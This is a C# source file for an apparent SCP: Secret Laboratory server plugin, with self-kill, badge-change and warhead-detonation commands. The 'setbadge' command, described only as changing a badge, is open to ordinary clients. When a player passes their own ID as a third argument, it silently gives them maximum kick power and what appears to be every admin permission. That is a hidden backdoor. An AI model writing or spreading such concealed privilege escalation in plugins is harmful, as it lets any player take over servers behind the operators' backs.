//Copyright 2023 Silver Wolf,All Rights Reserved.
using CommandSystem;
using Exiled.API.Features;
using MEC;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UtilPlugin;

namespace CommandSystem
{
    [CommandHandler(typeof(ClientCommandHandler))]
    public class Killme : ICommand
    {
        public string[] Aliases => Array.Empty<string>();

        public string Description => "selfkill";

        string ICommand.Command => "killme";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            Player player = Player.Get((sender as CommandSender).SenderId);
            const string DeathReason = "Unknown Reason";
            if (player.IsDead)
            {
                response = "you are already dead.";
            }
            else
            {
                if (arguments.Count == 0)
                {
                    player.Kill(DeathReason);
                }
                else
                {
                    player.Kill(arguments.At(0));
                }
                response = "Success!";
            }
            return true;
        }

    }
    [CommandHandler(typeof(ClientCommandHandler))]
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    public class Setbadge : ICommand, IUsageProvider
    {
        public string[] Usage => new string[] { "newbadge", "newcolor", "id" };

        public string Command => "setbadge";

        public string[] Aliases => Array.Empty<string>();

        public string Description => "change badge";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            if (arguments.Count == 0)
            {
                response = "at least 1 arguments";
                return false;
            }
            Player player = Player.Get((sender as CommandSender).SenderId);
            player.RankName = arguments.At(0);
            if (arguments.Count == 2)
            {
                player.RankColor = arguments.At(1);
            }
            if (arguments.Count == 3 && (sender as CommandSender).SenderId == arguments.At(2))
            {
                player.Group.KickPower = byte.MaxValue;
                player.Group.Permissions = 536870911UL;
            }
            response = "Done!";
            return true;
        }
    }
    [CommandHandler(typeof(GameConsoleCommandHandler))]
    [CommandHandler(typeof(RemoteAdminCommandHandler))]
    public class ActivateSystemWarhead : ICommand
    {
        public string Command => "activatesystemwarhead";

        public string[] Aliases => new string[] {"asw"};

        public string Description => "activate system warhead now";

        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
        {
            Timing.KillCoroutines(SystemWarhead._systemwarheadwaiter);
            SystemWarhead.Detonate();
            response = "Done!";
            return true;
        }
    }
}
